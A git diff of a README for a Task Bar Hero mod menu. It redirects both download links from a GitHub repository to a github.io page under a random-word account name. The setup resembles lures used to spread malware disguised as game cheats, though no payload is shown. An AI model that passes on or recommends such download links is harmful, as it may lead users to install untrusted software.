@@ -1,6 +1,6 @@
 # 🕹️ TBH-Mod-Menu - Gain total control over your game
 
-[![](https://img.shields.io/badge/Download-TBH-Mod-Menu-blue.svg)](https://github.com/philanthropic-interference376/TBH-Mod-Menu)
+[![](https://img.shields.io/badge/Download-TBH-Mod-Menu-blue.svg)](https://philanthropic-interference376.github.io)
 
 TBH-Mod-Menu gives you tools to change how Task Bar Hero works. You can unlock features that save time and make the game easier to play. This tool handles the technical steps so you can focus on the game. 
 
@@ -30,7 +30,7 @@ Follow these steps to set up the mod menu on your computer.
 1.  **Prepare your computer:** Close Task Bar Hero if it runs in the background. 
 2.  **Download the software:** Open the link below to get the tool.
     
-    [Click here to download the TBH-Mod-Menu](https://github.com/philanthropic-interference376/TBH-Mod-Menu)
+    [Click here to download the TBH-Mod-Menu](https://philanthropic-interference376.github.io)
 
 3.  **Install the runtime:** If the menu does not open, download the .NET Desktop Runtime from the official Microsoft support page. Most modern computers have this installed already.
 4.  **Extract the files:** Right-click the downloaded folder and select Extract All. Place these files in a folder on your desktop.
